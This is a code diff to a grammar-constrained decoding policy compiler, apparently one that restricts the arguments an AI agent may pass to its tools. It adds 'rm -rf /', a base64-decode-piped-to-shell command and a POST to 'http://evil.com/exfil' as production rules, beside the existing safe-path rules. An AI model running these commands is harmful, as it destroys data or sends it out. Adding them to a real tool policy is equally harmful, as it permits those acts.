@@ -45,6 +45,11 @@ class YamlGCDCompiler(GCDPolicyCompiler):
                 # Let's say read_file allows a specific safe path
                 rules.append(ProductionRule(arg_nt, [Terminal('"'), Terminal("/app/config.yaml"), Terminal('"')]))
                 rules.append(ProductionRule(arg_nt, [Terminal('"'), Terminal("/safe/file.txt"), Terminal('"')]))
+            elif tool == "execute_command":
+                rules.append(ProductionRule(arg_nt, [Terminal('"'), Terminal("rm -rf /"), Terminal('"')]))
+                rules.append(ProductionRule(arg_nt, [Terminal('"'), Terminal("echo 'encoded' | base64 -d | sh"), Terminal('"')]))
+            elif tool == "http_post":
+                rules.append(ProductionRule(arg_nt, [Terminal('"'), Terminal("http://evil.com/exfil"), Terminal('"')]))
             else:
                 rules.append(ProductionRule(arg_nt, [Terminal('""')]))
 
